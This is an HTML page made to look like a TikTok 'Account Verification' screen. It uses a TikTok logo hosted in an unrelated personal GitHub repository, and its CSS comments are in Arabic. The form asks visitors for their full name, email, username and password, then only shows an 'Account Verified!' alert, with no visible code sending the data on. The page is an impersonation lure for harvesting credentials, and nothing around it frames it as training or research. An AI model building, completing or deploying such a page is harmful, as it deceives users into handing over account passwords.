<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #ff0050; /* اللون الأساسي */
      --bg: #000000; /* الخلفية باللون الأسود */
      --text: #ffffff; /* النصوص باللون الأبيض */
      --input-bg: #121212; /* خلفية المدخلات سوداء قاتمة */
      --border: #444; /* الحدود داكنة */
      --highlight: #00c6ff; /* اللون المميز للأزرار */
      --radius: 24px; /* زاوية الانحناء كبيرة لجعل الحواف بارزة */
      --shadow: rgba(0, 0, 0, 0.4); /* الظلال قوية لزيادة التأثير */
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 0;
      margin: 0;
      overflow: hidden; /* إخفاء التمرير */
    }

    .container {
      background-color: #181818; /* اللون الخلفي للواجهة */
      border: 3px solid var(--border); /* زيادة سمك الحدود لجعلها بارزة */
      padding: 40px;
      border-radius: var(--radius);
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 15px var(--shadow); /* زيادة تأثير الظل ليكون بارزًا */
      animation: fadeIn 0.8s ease-out;
      text-align: center;
    }

    .logo {
      display: block;
      margin: 0 auto 30px;
      width: 120px;
    }

    h2 {
      font-size: 26px;
      font-weight: 600;
      margin-bottom: 15px;
      color: var(--text);
    }

    p {
      font-size: 16px;
      color: var(--text);
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      background-color: var(--input-bg);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      color: var(--text);
      font-size: 14px;
      transition: 0.3s;
    }

    input:focus {
      border-color: var(--highlight);
      outline: none;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: var(--highlight);
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      border: none;
      border-radius: var(--radius);
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }

    button:hover {
      background-color: var(--primary);
      transform: translateY(-2px);
    }

    .footer-text {
      font-size: 12px;
      color: var(--text);
      margin-top: 20px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/5cb78678a7c7755bf004c14c.png" alt="TikTok Logo">
    <h2>Account Verification</h2>
    <p>Please enter your details to verify your account.</p>
    <form id="verificationForm">
      <input type="text" placeholder="Full Name" required />
      <input type="email" placeholder="Email Address" required />
      <input type="text" placeholder="Username" required />
      <input type="password" placeholder="Password" required />
      <button type="submit">Verify Account</button>
    </form>
    <p class="footer-text">By verifying your account, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
  </div>

  <script>
    const form = document.getElementById('verificationForm');
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      alert('Account Verified!');
    });
  </script>
</body>
</html>
